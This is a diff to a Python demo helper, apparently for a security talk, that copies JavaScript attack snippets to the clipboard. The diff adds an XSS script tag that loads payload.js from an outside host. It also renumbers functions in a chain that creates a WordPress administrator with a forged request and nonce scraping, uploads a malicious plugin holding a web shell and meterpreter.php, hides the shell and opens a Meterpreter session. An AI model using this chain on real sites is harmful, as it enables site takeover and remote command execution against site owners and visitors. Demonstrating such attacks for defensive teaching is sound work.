@@ -32,9 +32,24 @@ def copyToClipboard(code):
 
 
 
+
+# First demo code, 
+# XSS to add to site
+def one():
+	code = """
+<script type="text/javascript" src="http://192.168.78.135:8888/payload.js"></script>
+	"""
+
+	copyToClipboard(code)
+
+	return "Script include ready..."
+
+
+
+
 # First demo code, 
 # simple alert popup
-def one():
+def two():
 	code = """
 function helloWorld()
 {
@@ -56,7 +71,7 @@ function helloWorld()
 
 
 # First version of add user, missing the nonce
-def two():
+def three():
 	code = """
 function addAdminUser()
 {
@@ -92,6 +107,8 @@ function addAdminUser()
 	body += "ure_other_roles=administrator&"; // insert Dr. Evil second muahahahaha
 	body += "createuser=Add+New+User";
 
+	console.log("Hopefully we just added a new admin user...");
+
 	xhr.send(body);
 }	
 	"""
@@ -107,7 +124,7 @@ function addAdminUser()
 
 
 # Code to find "add user" nonce
-def three():
+def four():
 	code = """
 function read_body(xhr) 
 { 
@@ -171,7 +188,7 @@ function findNonce()
 
 
 # Woohoo! Working admin user!
-def four():
+def five():
 	code = """
 // Parse out the nonce value then pass to the add user function
 function addAdminUser()
@@ -226,6 +243,8 @@ function addAdminUser()
 			body += "createuser=Add+New+User";
 
 			xhr.send(body);
+
+			console.log("Do we have a new admin user now????");
 		}
 	}
 }
@@ -243,7 +262,7 @@ function addAdminUser()
 
 
 # Find the plugin nonce, nothing else yet
-def five():
+def six():
 	code = """
 function installYertleShell()
 {
@@ -287,7 +306,7 @@ function installYertleShell()
 # and parsing of installation directory. Note the extra 
 # escapes needed below for this to come through 
 # correctly
-def six():
+def seven():
 	code = """
 var webShellPath    = "shell/shell.php";
 var phpMetShellPath = "shell/meterpreter.php";
@@ -363,7 +382,7 @@ function installYertleShell()
 			}
 			uploadXhr.send(new Blob([aBody]));
 
-			console.log("Done uploading malicious plugin");
+			console.log("Done sending malicious plugin install POST...");
 		}
 	}
 }
@@ -379,7 +398,7 @@ function installYertleShell()
 
 
 
-def seven():
+def eight():
 	code = """
 			// We need to know path to our shell, so we need to know where
 			// WordPress installed it. Let's parse the path
@@ -416,7 +435,7 @@ def seven():
 
 
 
-def eight():
+def nine():
 	code = """
 const sleep = (milliseconds) => 
 {
@@ -478,7 +497,7 @@ async function runCmd()
 
 
 # Extra escaping needed below
-def nine():
+def ten():
 	code = """
 async function hideYertleShell()
 {
@@ -560,7 +579,7 @@ async function hideYertleShell()
 
 
 # Extra escaping needed below
-def ten():
+def eleven():
 	code = """
 // Set your handler's IP and port below.
 async function openPhpMeterpreterSession()
@@ -669,7 +688,7 @@ async function openPhpMeterpreterSession()
 	// be there
 	await sleep(10000);
 
-	console.log ("Sending command to execute shell...");
+	console.log ("Sending command to execute meterpreter shell...");
     commandValue = "php meterpreter.php";
     payload = btoa(commandValue);
 
@@ -712,6 +731,7 @@ def handleInput(input):
         8: eight,
         9: nine,
         10: ten,
+        11: eleven,
         exit: gimmeOuttaHere,
         quit: gimmeOuttaHere
 	}
